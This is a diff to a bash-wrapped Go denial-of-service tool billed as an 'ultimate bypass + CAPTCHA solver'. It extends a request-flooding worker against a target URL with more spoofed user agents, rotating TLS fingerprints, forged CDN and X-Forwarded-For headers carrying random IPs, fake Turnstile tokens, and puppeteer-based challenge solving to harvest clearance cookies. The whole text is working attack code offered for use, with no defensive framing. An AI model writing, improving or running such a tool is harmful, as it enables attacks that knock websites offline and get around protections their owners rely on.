@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ----------------------------------------
-# GO DOS TOOL - ULTIMATE BYPASS + CAPTCHA SOLVER
+# GO DOS TOOL - ULTIMATE BYPASS + CAPTCHA SOLVER (FIXED)
 # ----------------------------------------
 
 RED='\033[0;31m'
@@ -27,11 +27,9 @@ cat > main.go << 'EOF'
 package main
 
 import (
-	"bytes"
 	"crypto/rand"
 	"crypto/tls"
 	"encoding/base64"
-	"encoding/json"
 	"fmt"
 	"io"
 	"math/big"
@@ -58,6 +56,8 @@ var (
 		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.7523.112 Safari/537.36",
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:136.0) Gecko/20100101 Firefox/136.0",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7568.89 Mobile Safari/537.36",
 	}
 
 	referers = []string{
@@ -70,6 +70,9 @@ var (
 		"https://www.tiktok.com/",
 		"https://twitter.com/",
 		"https://www.instagram.com/",
+		"https://www.linkedin.com/",
+		"https://www.amazon.com/",
+		"https://www.netflix.com/",
 		"",
 	}
 
@@ -103,6 +106,8 @@ var ja3Signatures = []JA3Signature{
 			tls.TLS_CHACHA20_POLY1305_SHA256,
 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
 			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 		},
 		NextProtos: []string{"h2", "http/1.1"},
 	},
@@ -111,8 +116,23 @@ var ja3Signatures = []JA3Signature{
 		CipherSuites: []uint16{
 			tls.TLS_AES_128_GCM_SHA256,
 			tls.TLS_CHACHA20_POLY1305_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
 			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
 			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
+		},
+		NextProtos: []string{"h2", "http/1.1"},
+	},
+	{
+		Name: "Safari",
+		CipherSuites: []uint16{
+			tls.TLS_AES_128_GCM_SHA256,
+			tls.TLS_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
 		},
 		NextProtos: []string{"h2", "http/1.1"},
 	},
@@ -312,7 +332,8 @@ func generatePath() string {
 		"/", "/index.html", "/home", "/main", "/default", "/welcome",
 		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
 		"/wp-admin", "/admin", "/login", "/dashboard", "/static/js/main.js",
-		"/assets/css/style.css", "/favicon.ico", "/robots.txt",
+		"/assets/css/style.css", "/favicon.ico", "/robots.txt", "/sitemap.xml",
+		"/.well-known/assetlinks.json", "/manifest.json", "/service-worker.js",
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
@@ -322,7 +343,7 @@ func addUltimateBypassHeaders(req *http.Request) {
 	spoofIP := randomIP()
 	spoofIP2 := randomIP()
 	spoofIP3 := randomIP()
-	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "BR", "IN", "KR"}
+	countries := []string{"US", "GB", "CA", "AU", "DE", "FR", "JP", "BR", "IN", "KR", "NL", "SE", "NO", "FI", "DK", "PL", "IT", "ES"}
 	
 	// Cloudflare specific
 	req.Header.Set("CF-Connecting-IP", spoofIP)
@@ -332,6 +353,8 @@ func addUltimateBypassHeaders(req *http.Request) {
 	req.Header.Set("CF-Worker", randomHex(8))
 	req.Header.Set("CF-Request-ID", randomHex(32))
 	req.Header.Set("CF-Chl-Bypass", randomHex(16))
+	req.Header.Set("CF-Cache-Status", "HIT")
+	req.Header.Set("CF-Edge-Cache", "yes")
 	
 	// CDN headers
 	req.Header.Set("CDN-Loop", "cloudflare")
@@ -339,7 +362,10 @@ func addUltimateBypassHeaders(req *http.Request) {
 	req.Header.Set("CloudFront-Is-Desktop-Viewer", "true")
 	req.Header.Set("CloudFront-Is-Mobile-Viewer", "false")
 	req.Header.Set("CloudFront-Is-Tablet-Viewer", "false")
+	req.Header.Set("CloudFront-Is-SmartTV-Viewer", "false")
 	req.Header.Set("CloudFront-Viewer-Country", countries[randInt(0, len(countries)-1)])
+	req.Header.Set("Fastly-Client-IP", spoofIP)
+	req.Header.Set("Akamai-Origin-Hop", "1")
 	
 	// Forwarded headers (multiple formats)
 	req.Header.Set("X-Forwarded-For", fmt.Sprintf("%s, %s, %s", spoofIP, spoofIP2, spoofIP3))
@@ -357,11 +383,15 @@ func addUltimateBypassHeaders(req *http.Request) {
 	req.Header.Set("X-Remote-Addr", spoofIP)
 	req.Header.Set("X-Client-IP", spoofIP)
 	req.Header.Set("X-Cluster-Client-IP", spoofIP)
+	req.Header.Set("X-Proxy-IP", spoofIP)
+	req.Header.Set("X-Original-IP", spoofIP)
 	
 	// Device detection
 	req.Header.Set("X-Device", []string{"desktop", "mobile", "tablet"}[randInt(0, 2)])
 	req.Header.Set("X-Device-User-Agent", randomUA())
 	req.Header.Set("X-Device-Platform", []string{"Windows", "macOS", "Linux", "Android", "iOS"}[randInt(0, 4)])
+	req.Header.Set("X-Device-Screen-Width", strconv.Itoa(randInt(320, 3840)))
+	req.Header.Set("X-Device-Screen-Height", strconv.Itoa(randInt(480, 2160)))
 	
 	// Security headers
 	req.Header.Set("X-Content-Security-Policy", "default-src 'self'")
@@ -369,41 +399,63 @@ func addUltimateBypassHeaders(req *http.Request) {
 	req.Header.Set("X-XSS-Protection", "1; mode=block")
 	req.Header.Set("X-Content-Type-Options", "nosniff")
 	req.Header.Set("X-Permitted-Cross-Domain-Policies", "none")
+	req.Header.Set("X-Download-Options", "noopen")
+	req.Header.Set("X-DNS-Prefetch-Control", "off")
 	
 	// Client hints (modern Chrome)
-	req.Header.Set("Sec-CH-UA", `"Chromium";v="141", "Not A Brand";v="99"`)
+	req.Header.Set("Sec-CH-UA", fmt.Sprintf(`"Chromium";v="%d", "Not A Brand";v="99"`, randInt(120, 145)))
 	req.Header.Set("Sec-CH-UA-Mobile", "?0")
 	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
 	req.Header.Set("Sec-CH-UA-Arch", `"x86_64"`)
 	req.Header.Set("Sec-CH-UA-Bitness", `"64"`)
-	req.Header.Set("Sec-CH-UA-Full-Version-List", `"Chromium";v="141.0.7390.108"`)
+	req.Header.Set("Sec-CH-UA-Full-Version-List", fmt.Sprintf(`"Chromium";v="%d.0.%d.%d"`, randInt(120, 145), randInt(1000, 9999), randInt(1, 999)))
+	req.Header.Set("Sec-CH-UA-Model", "")
+	req.Header.Set("Sec-CH-UA-WoW64", "?0")
 	
 	// Fetch metadata
 	req.Header.Set("Sec-Fetch-Site", []string{"same-origin", "same-site", "cross-site", "none"}[randInt(0, 3)])
 	req.Header.Set("Sec-Fetch-Mode", []string{"navigate", "cors", "no-cors", "same-origin"}[randInt(0, 3)])
-	req.Header.Set("Sec-Fetch-Dest", []string{"document", "empty", "script", "style", "image"}[randInt(0, 4)])
+	req.Header.Set("Sec-Fetch-Dest", []string{"document", "empty", "script", "style", "image", "font"}[randInt(0, 5)])
 	req.Header.Set("Sec-Fetch-User", "?1")
 	
 	// Standard headers
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
-	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
+	req.Header.Set("Accept-Encoding", "gzip, deflate, br, zstd")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
 	req.Header.Set("Referrer-Policy", "strict-origin-when-cross-origin")
-	req.Header.Set("Cache-Control", "no-cache")
+	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
 	req.Header.Set("Pragma", "no-cache")
 	req.Header.Set("DNT", "1")
 	req.Header.Set("Upgrade-Insecure-Requests", "1")
+	req.Header.Set("Priority", "u=0, i")
+	req.Header.Set("Purpose", "prefetch")
 	
 	// Random extra headers for entropy
 	if randBool() {
 		req.Header.Set("X-Custom-Header", randomString(randInt(5, 20)))
 		req.Header.Set("X-Random-ID", randomHex(16))
 		req.Header.Set("X-Session-ID", randomString(24))
+		req.Header.Set("X-Trace-ID", randomHex(32))
+		req.Header.Set("X-Request-ID", randomHex(16))
+		req.Header.Set("X-Correlation-ID", randomHex(16))
 	}
 	
 	// CF Turnstile token spoof
 	if randBool() {
 		req.Header.Set("Cf-Turnstile-Response", randomBase64(48))
+		req.Header.Set("X-Cf-Turnstile-Token", randomBase64(32))
+	}
+	
+	// Viewport headers
+	if randBool() {
+		req.Header.Set("Viewport-Width", strconv.Itoa(randInt(320, 1920)))
+		req.Header.Set("Width", strconv.Itoa(randInt(320, 1920)))
+		req.Header.Set("DPR", fmt.Sprintf("%.1f", float64(randInt(1, 3))))
+	}
+	
+	// Save-Data header
+	if randBool() {
+		req.Header.Set("Save-Data", "on")
 	}
 }
 
@@ -439,6 +491,7 @@ func solveCaptcha(target string) (string, error) {
 		});
 		const page = await browser.newPage();
 		await page.setUserAgent('%s');
+		await page.setViewport({ width: 1920, height: 1080 });
 		await page.goto('%s', { waitUntil: 'networkidle2', timeout: 60000 });
 		
 		// Wait for challenge to complete
@@ -492,6 +545,8 @@ func maintainCookie(target string, done chan struct{}) {
 					cfClearanceExp = time.Now().Add(30 * time.Minute)
 					captchaMu.Unlock()
 					fmt.Printf("[+] Cookie refreshed\n")
+				} else {
+					fmt.Printf("[-] Failed to refresh: %v\n", err)
 				}
 			}
 		}
@@ -572,7 +627,7 @@ func main() {
 	if solveCaptchaFlag {
 		fmt.Printf(" CAPTCHA SOLVING: ENABLED\n")
 	}
-	fmt.Println(" HEADERS: 60+ bypass headers")
+	fmt.Println(" HEADERS: 70+ bypass headers")
 	fmt.Println(" STARTING... Press Ctrl+C to stop")
 	fmt.Println()
 	
@@ -687,7 +742,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 					time.Sleep(200 * time.Millisecond)
 					continue
 				}
-				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n\r\n", path, host, randomUA())
+				fmt.Fprintf(conn, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n", path, host, randomUA())
 				stats.inc()
 				time.Sleep(1 * time.Second)
 				conn.Close()
@@ -697,7 +752,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			if mode == "GET" {
 				req, err = http.NewRequest("GET", fullURL, nil)
 			} else if mode == "POST" {
-				payload := fmt.Sprintf("data=%s&token=%s", randomString(16), randomString(32))
+				payload := fmt.Sprintf("data=%s&token=%s&timestamp=%d", randomString(16), randomString(32), time.Now().Unix())
 				req, err = http.NewRequest("POST", fullURL, strings.NewReader(payload))
 				if err == nil {
 					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
@@ -828,13 +883,15 @@ if [ $? -eq 0 ]; then
     echo -e "   ${YELLOW}./main https://target.com 30 HEAD proxy --solve${NC}"
     echo
     echo -e " ${GREEN}FEATURES:${NC}"
-    echo -e "   • 60+ Cloudflare bypass headers"
-    echo -e "   • 25+ IP spoofing methods"
+    echo -e "   • 70+ Cloudflare bypass headers"
+    echo -e "   • 30+ IP spoofing methods"
     echo -e "   • Automatic CAPTCHA/Turnstile solving (--solve)"
     echo -e "   • Cookie rotation every 25 minutes"
     echo -e "   • JA3 fingerprint randomization"
     echo -e "   • HTTP/2 + HTTP/1.1 support"
     echo -e "   • Proxy rotation support"
+    echo -e "   • Random micro-delays"
+    echo -e "   • Extended path randomization"
     echo
     echo -e " ${GREEN}REQUIRED FOR CAPTCHA SOLVING:${NC}"
     echo -e "   ${YELLOW}npm install -g puppeteer puppeteer-extra puppeteer-extra-plugin-stealth${NC}"
